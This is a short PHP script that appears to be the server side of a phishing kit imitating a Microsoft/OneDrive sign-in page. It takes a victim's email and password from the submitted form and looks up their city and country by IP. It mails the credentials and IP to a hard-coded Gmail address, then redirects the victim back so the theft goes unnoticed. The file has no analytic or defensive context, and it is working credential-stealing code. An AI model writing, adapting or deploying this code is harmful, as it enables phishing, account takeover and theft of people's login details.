<?php
if (isset($_GET['X1']))
{

  $email = $_GET['X1'];
	

$ip_address = getenv("REMOTE_ADDR");
$geopluginURL = 'http://www.geoplugin.net/php.gp?ip='.$ip_address;
$addrDetailsArr = unserialize(file_get_contents($geopluginURL));
$city = $addrDetailsArr['geoplugin_city']; 
$country = $addrDetailsArr['geoplugin_countryName'];

$pass=$_POST['password'];

$message = "Sign In from microsoft\n";
$message .= "Email= $email\n";
$message .= "Pass= $pass\n";
$message .= "IP= $ip_address\n";


$send = "aloziebright34@gmail.com";
$subject = "onedrive! | $country"; 
$headers = "From: Client"; 
$headers .= "MIME-Version:1.0\r\n"; 
$arr=array($send, $ip_address); 
foreach ($arr as $send) 
mail($send,$subject,$message,$headers);

header('Location: ' . $_SERVER['HTTP_REFERER']);

}
else{
    header('Location: ' . $_SERVER['HTTP_REFERER']);
    
}
?>